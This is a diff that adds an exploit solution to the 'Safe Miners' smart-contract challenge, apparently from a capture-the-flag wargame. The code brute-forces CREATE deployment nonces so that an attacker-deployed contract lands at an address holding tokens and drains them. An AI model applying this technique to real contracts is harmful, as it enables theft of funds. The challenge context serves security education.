@@ -24,6 +24,34 @@ describe('[Challenge] Safe Miners', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+        /**
+         * This challenge is more of a guess-work
+         * 
+         * We just get lucky that the attacker address here, when used with a specific nonce, can deploy a smart contract, which in turn when used with another specific nonce, can deploy another smart contract exactly our target address.
+         * 
+         * If the final smart contract contains code that transfers the attacker all tokens, then the challenge is solved.
+         * 
+         * This solution relies on the face that `CREATE` results in smart contract addresses that depend only on deployer address and an incrementing nonce.
+         */
+
+        const maxNonce = 100;
+
+        // Deploy MissileLauncher contract
+        const missileLauncherFactory = await ethers.getContractFactory("MissileLauncher");
+
+        let i = 0;
+        for (; i < maxNonce; i++) {
+            await missileLauncherFactory.connect(attacker).deploy(
+                maxNonce,
+                this.token.address,
+                DEPOSIT_ADDRESS
+            );
+            if ((await this.token.balanceOf(attacker.address)).gt(0)) {
+                break;
+            }
+        }
+        console.log(`Attacker nonce: ${i}`);
     });
 
     after(async function () {
@@ -36,4 +64,16 @@ describe('[Challenge] Safe Miners', function () {
             await this.token.balanceOf(attacker.address)
         ).to.eq(DEPOSIT_TOKEN_AMOUNT);
     });
+
+    /////////////////////////
+    // HELPERS //////////////
+    /////////////////////////
+
+    function calculateCreate2AddressFromSalt(missileLauncherContractAddr, salt, missileLauncherContractBytecodeHash) {
+        return ethers.utils.getCreate2Address(
+            missileLauncherContractAddr,
+            salt,
+            missileLauncherContractBytecodeHash
+        );
+    }
 });
